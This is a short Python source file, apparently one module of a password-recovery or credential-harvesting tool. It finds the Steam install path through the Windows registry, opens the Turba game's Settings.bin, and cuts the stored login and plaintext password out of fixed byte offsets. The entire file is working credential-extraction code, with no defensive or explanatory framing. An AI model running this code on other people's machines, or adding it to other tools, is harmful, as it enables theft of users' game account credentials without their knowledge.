import os
from _winreg import HKEY_CURRENT_USER, OpenKey, QueryValueEx

class Turba():
	
	def run(self):
		creds = []
		
		# Find the location of steam - to make it easier we're going to use a try block
		# 'cos I'm lazy
		try:
			with OpenKey(HKEY_CURRENT_USER, 'Software\Valve\Steam') as key:
				results=QueryValueEx(key, 'SteamPath')
		except:
			return
		
		if not results:
			return
			
		steampath=results[0]
		steamapps = steampath + '\\SteamApps\common'
		
		# Check that we have a SteamApps directory
		if not os.path.exists(steamapps):
			return
		
		filepath = steamapps + '\\Turba\\Assets\\Settings.bin'
		
		if not os.path.exists(filepath):
			return
			
		# If we're here we should have a valid config file file
		with open(filepath, mode='rb') as filepath: 
			# We've found a config file, now extract the creds
			data = filepath.read()
			values = {}
			
			chunk=data[0x1b:].split('\x0a')
			values['Login'] = chunk[0]
			values['Password'] = chunk[1]
			values['Category'] = "Turba"
			creds.append(values)
		
		return creds
					
				
